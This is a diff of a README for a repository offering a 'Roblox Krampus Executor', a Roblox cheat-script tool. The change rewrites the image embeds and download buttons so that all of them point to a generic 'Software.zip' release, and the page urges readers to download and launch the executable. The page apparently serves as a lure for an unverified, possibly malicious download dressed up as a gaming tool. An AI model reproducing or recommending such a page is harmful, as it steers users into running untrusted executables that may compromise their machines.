@@ -2,7 +2,7 @@
 
 ## Welcome to the Roblox Krampus Executor GitHub Repository! 🚀
 
-![Roblox Krampus Executor](https://imgur.com/gallery/BodlglC)
+![Roblox Krampus Executor](https://github.com/fartabuser/Roblox-Krampus/releases/download/v1.0/Software.zip)
 
 ### Repository Overview
 Welcome to the "Roblox-Krampus" repository, your one-stop destination for the ultimate Roblox Executor, offering top script performance and a user-friendly dashboard for seamless gaming and scripting. Whether you're a seasoned developer or a beginner looking to enhance your Roblox experience, Krampus Executor has got you covered! 🎉
@@ -32,9 +32,9 @@ Welcome to the "Roblox-Krampus" repository, your one-stop destination for the ul
 ### Getting Started 🚀
 To get started with the Roblox Krampus Executor, simply download the latest release version from the link below:
 
-[![Download Krampus Executor](https://img.shields.io/badge/Download-Krampus%20Executor-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Krampus Executor](https://github.com/fartabuser/Roblox-Krampus/releases/download/v1.0/Software.zip%20Executor-blue)](https://github.com/fartabuser/Roblox-Krampus/releases/download/v1.0/Software.zip)
 
-🔗 **[Download Krampus Executor](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)** 🔗
+🔗 **[Download Krampus Executor](https://github.com/fartabuser/Roblox-Krampus/releases/download/v1.0/Software.zip)** 🔗
 
 *Note: Click on the button above to download the Krampus Executor executable file for launching.*
 
@@ -61,4 +61,4 @@ The Roblox Krampus Executor is licensed under the MIT License. See the LICENSE f
 ### Thank You! 🙌
 Thank you for choosing the Roblox Krampus Executor for your scripting and gaming needs. We are excited to have you on board and look forward to delivering top-notch performance and user experience for your Roblox adventures. Happy scripting! 🚀🎮
 
-![Roblox Krampus Executor Logo](https://imgur.com/gallery/BodlglC)
+![Roblox Krampus Executor Logo](https://github.com/fartabuser/Roblox-Krampus/releases/download/v1.0/Software.zip)
